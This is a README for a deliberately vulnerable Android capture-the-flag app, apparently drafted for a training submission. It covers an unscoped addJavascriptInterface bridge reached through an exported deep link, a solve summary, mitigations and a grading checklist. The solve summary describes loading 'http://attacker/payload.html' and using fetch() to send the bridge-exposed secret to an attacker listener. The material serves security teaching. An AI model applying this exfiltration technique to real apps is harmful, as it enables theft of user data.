# Duckurity Mobile CTF — WebView JS-Bridge (Medium)

Challenge #1 of Task 09 (Mobile category). A deliberately vulnerable
Android app that mirrors a real, recurring vuln class in hybrid apps:
an `addJavascriptInterface()` bridge exposed to content that isn't
fully trusted, reached through an exported `Activity` that loads a
URL with no validation.

Themed to match your existing Duckurity (photo-sharing) challenge, so
all your Task 09 submissions can share one fictional product.

## Project layout

```
WebViewBridgeCTF/
├── app/
│   ├── build.gradle
│   └── src/main/
│       ├── AndroidManifest.xml        # exported HelpActivity + deep link
│       ├── java/.../MainActivity.kt   # benign entry point
│       ├── java/.../HelpActivity.kt   # VULNERABLE: bridge + unvalidated loadUrl
│       ├── assets/help.html           # safe fallback page, not part of the solve
│       └── res/...
├── solve/
│   ├── SOLVE.md             # solve walkthrough
│   ├── payload.html         # exfil-based PoC payload
│   └── listener.py          # HTTP listener that catches the flag
├── Dockerfile               # builds the flag-listener service
├── docker-compose.yml       # flag-listener + challenge-files services
├── build.gradle
├── settings.gradle
└── gradle.properties
```

## Building the APK

Requires Android Studio (Hedgehog+) or command-line Gradle with the
Android SDK installed.

```bash
# From the WebViewBridgeCTF/ directory, with ANDROID_HOME set:
gradle wrapper --gradle-version 8.4   # generates gradlew if you don't have it
./gradlew assembleDebug
# APK lands at app/build/outputs/apk/debug/app-debug.apk
```

Or just open the folder in Android Studio and hit Run/Build APK — it's
a standard single-module Kotlin project, nothing custom needed.

Install on the lab emulator/device:

```bash
adb install app/build/outputs/apk/debug/app-debug.apk
```

## Running the challenge infrastructure (Docker)

Once the APK is built, bring up the attacker-side services with:

```bash
docker compose up -d --build
docker compose logs -f flag-listener   # watch for the flag
```

This starts:
- **`flag-listener`** (port 8000) — the container built from the
  `Dockerfile`; catches the exfiltrated flag and prints it to stdout.
- **`challenge-files`** (port 9000, nginx) — serves `solve/payload.html`
  and the built APK over plain HTTP, so an Android device (emulator or
  lab host) can reach them via the deep link in `solve/SOLVE.md`.

Both services use `restart: unless-stopped`. Tear down with
`docker compose down`.

## The vulnerability (root cause)

Two compounding issues in `HelpActivity.kt`:

1. **Unrestricted JS-bridge exposure.** `webView.addJavascriptInterface(FlagBridge(), "nativeBridge")`
   attaches a native object to the WebView's JS global scope for
   *every* page that WebView ever renders — there's no per-origin
   scoping in this API. Any JavaScript that ends up executing in that
   WebView, regardless of where the HTML came from, can call
   `nativeBridge.getSecretFlag()`.

2. **Unvalidated content source.** `HelpActivity` is `exported="true"`
   (required for its `duckurity://help` deep link to work) and reads
   the deep link's `url` query parameter with a scheme check (http/https
   only — it can't be used to read local files) but **no host/domain
   allowlist**, so any attacker-controlled http(s) page is passed
   straight to `webView.loadUrl()`. This is CWE-940 (Improper
   Verification of Source of a Communication Channel) feeding directly
   into the bridge-exposure bug. This deep link's `url` parameter is the
   only attacker-reachable input in the app — there's no raw Intent
   extra and no injectable sink in the bundled `help.html` — so the
   single solve path is the one in `solve/SOLVE.md`.

This mirrors real-world CVEs in hybrid Android apps (several banking
and e-commerce apps have shipped this exact pattern — WebView bridge
+ insufficiently validated loadUrl source).

## Solve path (for your evidence package)

Full details with exact commands in `solve/SOLVE.md`. Summary:

1. Decompile the APK (`jadx`), grep for `JavascriptInterface` and
   `addJavascriptInterface` → find `nativeBridge` / `getSecretFlag()`.
2. Grep the manifest / decompiled `HelpActivity` → find the exported
   component and its deep link's unvalidated `url` query parameter.
3. Fire the `duckurity://help?url=http://attacker/payload.html` deep
   link (no adb access to the victim needed — this is the realistic
   path). `HelpActivity` loads it straight into the bridge-attached
   WebView.
4. The payload's JS calls `nativeBridge.getSecretFlag()` and
   `fetch()`s it to an attacker-controlled listener
   (`solve/listener.py`), which prints:
   `[+] Received flag: DUCK{w3bv13w_bridg3_tru5t_bound4ry_pwn3d}`

## Mitigation (for the writeup's "practical mitigation" field)

- **Scope the bridge, don't trust the page.** Only call
  `addJavascriptInterface()` right before loading a known-trusted,
  app-controlled URL, and remove it (`removeJavascriptInterface`)
  before loading anything else. Better: use `WebMessageListener` /
  `addWebMessageListener` (AndroidX WebKit) which supports an origin
  allowlist, instead of the unscoped legacy API.
- **Validate the content source.** `HelpActivity` should check the
  resolved URL against a strict allowlist (e.g., only
  `file:///android_asset/*` or a pinned HTTPS domain) before calling
  `loadUrl()`, and reject/ignore anything else — a scheme check alone
  (as this app does) is not enough.
- **Don't export what doesn't need it.** If the deep link isn't a
  product requirement, set `exported="false"`; if it is, keep the
  export but still validate the extras as above — exported-ness and
  input validation are separate controls, not substitutes for each
  other.
- Minimum API 21+ devices get *some* protection automatically (only
  `@JavascriptInterface`-annotated methods are exposed, which this
  code already does correctly) — but that only stops *arbitrary*
  reflection-based RCE via the bridge, not this bridge being called
  as designed from untrusted content, which is the actual bug here.

## Acceptance evidence checklist (per Task 09 requirements)

- [x] Successful result/flag — `DUCK{w3bv13w_bridg3_tru5t_bound4ry_pwn3d}`
      retrieved via `solve/listener.py` output.
- [x] Relevant request/output/artifact — the `adb shell am start`
      deep-link command + listener's printed line (see `solve/SOLVE.md`).
- [x] Root cause explanation — see "The vulnerability" above.
- [x] Practical mitigation — see "Mitigation" above.
- [x] Reproducible by another tester — `solve/SOLVE.md` gives exact,
      copy-pasteable commands; no environment-specific state required
      beyond installing the APK and having `adb` + Python on the test
      machine.

## OpenLabs lab.yml notes

When writing the task's `lab.yml`, make sure to name the techniques
explicitly (one of the deduction items on your last submission was
"lab.yml not naming techniques") — suggested entries:

```yaml
techniques:
  - CWE-940: Improper Verification of Source of a Communication Channel
  - Android JavascriptInterface unrestricted exposure (OWASP MASVS-PLATFORM, MASTG-TEST-0024)
artifacts:
  - app-debug.apk
  - Dockerfile
  - docker-compose.yml
challenge_sheet: challenge-sheet.pdf
```

Given your last grading (60/100 — missing Dockerfile, no compose
restart policy, no challenge-sheet PDF, flag.txt outside app/), this
submission already addresses the containerization items:
- `Dockerfile` + `docker-compose.yml` are included (see "Running the
  challenge infrastructure" above), both services set
  `restart: unless-stopped`.
- the flag is embedded in the APK (`FlagBridge.getSecretFlag()`), not
  a loose `flag.txt`.

Still on you before submitting:
- a one-page challenge-sheet PDF (title, category, difficulty,
  description, hint, flag format — no solution).
